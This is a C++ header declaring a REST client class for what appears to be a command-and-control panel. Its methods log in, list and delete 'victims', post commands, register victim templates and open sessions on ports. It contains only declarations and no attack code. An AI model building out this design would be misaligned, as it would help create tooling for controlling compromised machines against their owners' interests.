#pragma once

#include "Util/Expected.hpp"
#include "CommandDAO.hpp"
#include "LogDAO.hpp"
#include "VictimDAO.hpp"
#include "VictimTemplateDAO.hpp"
#include "Model.hpp"

#include <RESTClient.hpp>
#include <HttpUtils.hpp>

#include <string>
#include <vector>

class RestGateway {
public:
    explicit RestGateway(std::string base_url = "");

    void configure(const std::string& base_url, const std::string& username, const std::string& password);
    void set_credentials(const std::string& username, const std::string& password);

    [[nodiscard]] malvex::Result<bool> login();
    [[nodiscard]] malvex::Result<std::vector<Victim>> fetch_victims();
    [[nodiscard]] malvex::Result<std::vector<LogDAO>> fetch_logs();
    [[nodiscard]] malvex::Result<LogDAO> post_log(const LogDAO& log);
    [[nodiscard]] malvex::Result<CommandDAO> post_command(const CommandDAO& command);
    [[nodiscard]] malvex::Result<VictimTemplateCreatedResponse> register_template(
        const VictimTemplateCreateRequest& request);
    [[nodiscard]] malvex::Result<std::string> open_session(int64_t port);
    [[nodiscard]] malvex::Result<std::string> close_session(int64_t port);
    [[nodiscard]] malvex::Result<bool> delete_victim(int64_t victim_id);

private:
    cpppwn::RESTClient m_rest_client;
    std::string m_base_url;
    std::string m_username;
    std::string m_password;

    void apply_auth();
};
